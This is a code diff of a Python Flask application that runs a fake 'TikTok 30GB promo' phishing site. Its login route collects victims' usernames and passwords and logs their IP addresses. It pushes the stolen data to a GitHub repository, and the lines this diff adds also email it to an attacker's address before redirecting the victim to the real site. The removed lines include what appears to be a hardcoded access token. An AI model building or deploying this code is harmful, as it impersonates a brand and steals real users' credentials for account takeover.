@@ -1,36 +1,46 @@
 # =============================================================================
-# TIKTOK 30GB PROMO – AUTO‑COMMIT TO GITHUB (NO ENV, HARDCODED TOKEN)
-# GitHub: AliHamza-lab/hackme
+# TIKTOK 30GB PROMO – WITH GITHUB AUTO‑COMMIT
 # =============================================================================
 
 import os
 import json
 import logging
+import smtplib
 import threading
 import requests
+from email.message import EmailMessage
 from datetime import datetime
 from flask import Flask, request, render_template_string, abort, redirect
-from github import Github, GithubException
+from github import Github
 
-# -------------------- CONFIGURATION --------------------
-# 🔴 REPLACE THIS WITH YOUR NEW VALID GITHUB TOKEN (starts with ghp_)
-GITHUB_TOKEN = "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"
+# -------------------- CONFIGURATION (EDIT THESE) --------------------
+GITHUB_TOKEN = "ghp_xxxxxxxxxxxxxxxxxxxx"        # Your personal access token
+REPO_NAME = "AliHamza-lab/your-repo-name"        # e.g., "AliHamza-lab/phish-data"
+GITHUB_BRANCH = "main"                           # "main" or "master"
 
-REPO_NAME = "AliHamza-lab/hackme"
-GITHUB_BRANCH = "main"          # change to "master" if needed
+VIEW_SECRET = "changeme123"                      # Secret to view captured data
+PUBLIC_URL = os.environ.get('PUBLIC_URL', '')    # e.g., "https://tiktok-promo.onrender.com"
 
-VIEW_SECRET = "changeme123"
-PUBLIC_URL = ""                  # optional: set to your Render URL for self-ping
+# Email alerts (set empty strings to disable)
+EMAIL_SENDER = ""          # e.g., "your@brevo.com"
+EMAIL_PASSWORD = ""
+EMAIL_FROM = ""
+EMAIL_RECEIVER = "ah3418678@gmail.com"
 
+SMTP_SERVER = "smtp-relay.brevo.com"
+SMTP_PORT = 587
+SMTP_USE_SSL = False
+
+# -------------------- REST OF CONFIG --------------------
 DATA_FILE = "captured_credentials.json"
 VISITORS_FILE = "visitors.json"
 PING_INTERVAL = 600
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 app = Flask(__name__)
 
-# ==================== HTML TEMPLATES (same as before) ====================
+# ==================== HTML TEMPLATES (FULL) ====================
 PROMO_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -358,46 +368,23 @@ PHISH_HTML = '''
 </html>
 '''
 
-# ==================== GITHUB AUTO‑COMMIT ====================
+# ==================== GITHUB AUTO-COMMIT ====================
 def commit_to_github(file_path, data):
-    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_NEW_GITHUB_TOKEN_HERE":
-        logger.warning("❌ No valid GitHub token provided. Please replace 'YOUR_NEW_GITHUB_TOKEN_HERE' with a real token.")
-        return False
-
-    branches_to_try = [GITHUB_BRANCH, "master", "main"]
-    success = False
-    last_error = None
-
-    for branch in branches_to_try:
+    if not GITHUB_TOKEN or not REPO_NAME:
+        return
+    try:
+        g = Github(GITHUB_TOKEN)
+        repo = g.get_repo(REPO_NAME)
+        content_str = json.dumps(data, indent=2, ensure_ascii=False)
         try:
-            g = Github(GITHUB_TOKEN)
-            repo = g.get_repo(REPO_NAME)
-            content_str = json.dumps(data, indent=2, ensure_ascii=False)
-
-            try:
-                contents = repo.get_contents(file_path, ref=branch)
-                repo.update_file(contents.path, f"Auto-update {file_path}", content_str, contents.sha, branch=branch)
-                logger.info(f"✅ Updated {file_path} on GitHub (branch: {branch})")
-                success = True
-                break
-            except GithubException as e:
-                if e.status == 404:
-                    repo.create_file(file_path, f"Create {file_path}", content_str, branch=branch)
-                    logger.info(f"✅ Created {file_path} on GitHub (branch: {branch})")
-                    success = True
-                    break
-                else:
-                    raise e
-        except GithubException as e:
-            last_error = e
-            logger.warning(f"Failed on branch {branch}: {e.data.get('message', str(e))}")
-        except Exception as e:
-            last_error = e
-            logger.warning(f"Unexpected error on branch {branch}: {e}")
-
-    if not success:
-        logger.error(f"❌ GitHub commit failed. Last error: {last_error}")
-    return success
+            contents = repo.get_contents(file_path, ref=GITHUB_BRANCH)
+            repo.update_file(contents.path, f"Auto-update {file_path}", content_str, contents.sha, branch=GITHUB_BRANCH)
+            logger.info(f"Updated {file_path} on GitHub")
+        except:
+            repo.create_file(file_path, f"Create {file_path}", content_str, branch=GITHUB_BRANCH)
+            logger.info(f"Created {file_path} on GitHub")
+    except Exception as e:
+        logger.error(f"GitHub commit error: {e}")
 
 def save_credentials(username, password, ip):
     entry = {"timestamp": datetime.now().isoformat(), "ip": ip, "username": username, "password": password}
@@ -408,8 +395,7 @@ def save_credentials(username, password, ip):
     data.append(entry)
     with open(DATA_FILE, 'w') as f:
         json.dump(data, f, indent=2)
-    logger.info(f"📝 Credentials saved locally for {username}")
-    threading.Thread(target=commit_to_github, args=(DATA_FILE, data)).start()
+    commit_to_github(DATA_FILE, data)
 
 def log_visitor(ip, ua):
     entry = {"timestamp": datetime.now().isoformat(), "ip": ip, "user_agent": ua}
@@ -420,10 +406,31 @@ def log_visitor(ip, ua):
     visitors.append(entry)
     with open(VISITORS_FILE, 'w') as f:
         json.dump(visitors, f, indent=2)
-    logger.info(f"👤 Visitor logged: {ip}")
-    threading.Thread(target=commit_to_github, args=(VISITORS_FILE, visitors)).start()
+    commit_to_github(VISITORS_FILE, visitors)
 
-# ==================== SELF‑PING (optional) ====================
+def send_email_alert(subject, body):
+    if not EMAIL_SENDER or not EMAIL_PASSWORD:
+        return
+    try:
+        msg = EmailMessage()
+        msg.set_content(body)
+        msg['Subject'] = subject
+        msg['From'] = EMAIL_FROM
+        msg['To'] = EMAIL_RECEIVER
+        if SMTP_USE_SSL:
+            with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as smtp:
+                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
+                smtp.send_message(msg)
+        else:
+            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
+                smtp.starttls()
+                smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
+                smtp.send_message(msg)
+        logger.info("Email alert sent")
+    except Exception as e:
+        logger.error(f"Email failed: {e}")
+
+# ==================== SELF-PING ====================
 def keep_alive():
     if not PUBLIC_URL:
         return
@@ -431,12 +438,12 @@ def keep_alive():
     while True:
         try:
             requests.get(url, timeout=10)
-            logger.info("💓 Self-ping OK")
-        except Exception as e:
-            logger.error(f"Self-ping failed: {e}")
+            logger.info("Self-ping OK")
+        except:
+            logger.error("Self-ping failed")
         threading.Event().wait(PING_INTERVAL)
 
-# ==================== FLASK ROUTES ====================
+# ==================== ROUTES ====================
 @app.route('/')
 def index():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
@@ -445,7 +452,6 @@ def index():
     global PUBLIC_URL
     if not PUBLIC_URL and request.host_url:
         PUBLIC_URL = request.host_url.rstrip('/')
-        logger.info(f"Auto-set PUBLIC_URL to {PUBLIC_URL}")
     return render_template_string(PROMO_HTML)
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -457,6 +463,9 @@ def login():
         if not username or not password:
             return render_template_string(PHISH_HTML, error="Both fields required")
         save_credentials(username, password, ip)
+        subject = f"🎁 TikTok Login - {username}"
+        body = f"Time: {datetime.now()}\nIP: {ip}\nUser: {username}\nPass: {password}"
+        threading.Thread(target=send_email_alert, args=(subject, body)).start()
         return redirect("https://www.tiktok.com")
     return render_template_string(PHISH_HTML, error=None)
 
@@ -466,60 +475,3 @@ def view_data():
     if key != VIEW_SECRET:
         abort(403)
     creds = json.load(open(DATA_FILE)) if os.path.exists(DATA_FILE) else []
-    visitors = json.load(open(VISITORS_FILE)) if os.path.exists(VISITORS_FILE) else []
-    return {"credentials": creds, "visitors": visitors}
-
-@app.route('/test-github')
-def test_github():
-    key = request.args.get('key', '')
-    if key != VIEW_SECRET:
-        abort(403)
-    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_NEW_GITHUB_TOKEN_HERE":
-        return {"status": "error", "error": "GitHub token not set or still placeholder"}, 500
-    try:
-        g = Github(GITHUB_TOKEN)
-        repo = g.get_repo(REPO_NAME)
-        contents = repo.get_contents("", ref=GITHUB_BRANCH)
-        return {
-            "status": "success",
-            "repo": REPO_NAME,
-            "branch": GITHUB_BRANCH,
-            "message": f"Connected. Found {len(contents)} items in root."
-        }
-    except GithubException as e:
-        return {"status": "error", "error": e.data.get('message', str(e)), "status_code": e.status}, 500
-    except Exception as e:
-        return {"status": "error", "error": str(e)}, 500
-
-@app.route('/force-commit')
-def force_commit():
-    key = request.args.get('key', '')
-    if key != VIEW_SECRET:
-        abort(403)
-    results = {}
-    if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, 'r') as f:
-            creds = json.load(f)
-        results['credentials'] = commit_to_github(DATA_FILE, creds)
-    else:
-        results['credentials'] = "no local file"
-    if os.path.exists(VISITORS_FILE):
-        with open(VISITORS_FILE, 'r') as f:
-            visitors = json.load(f)
-        results['visitors'] = commit_to_github(VISITORS_FILE, visitors)
-    else:
-        results['visitors'] = "no local file"
-    return results
-
-@app.route('/health')
-def health_check():
-    return 'OK', 200
-
-# ==================== MAIN ====================
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_NEW_GITHUB_TOKEN_HERE":
-        logger.warning("⚠️  GitHub token is missing or still placeholder. Auto-commit will not work.")
-    threading.Thread(target=keep_alive, daemon=True).start()
-    logger.info(f"🚀 Starting on port {port}")
-    app.run(host='0.0.0.0', port=port, debug=False)
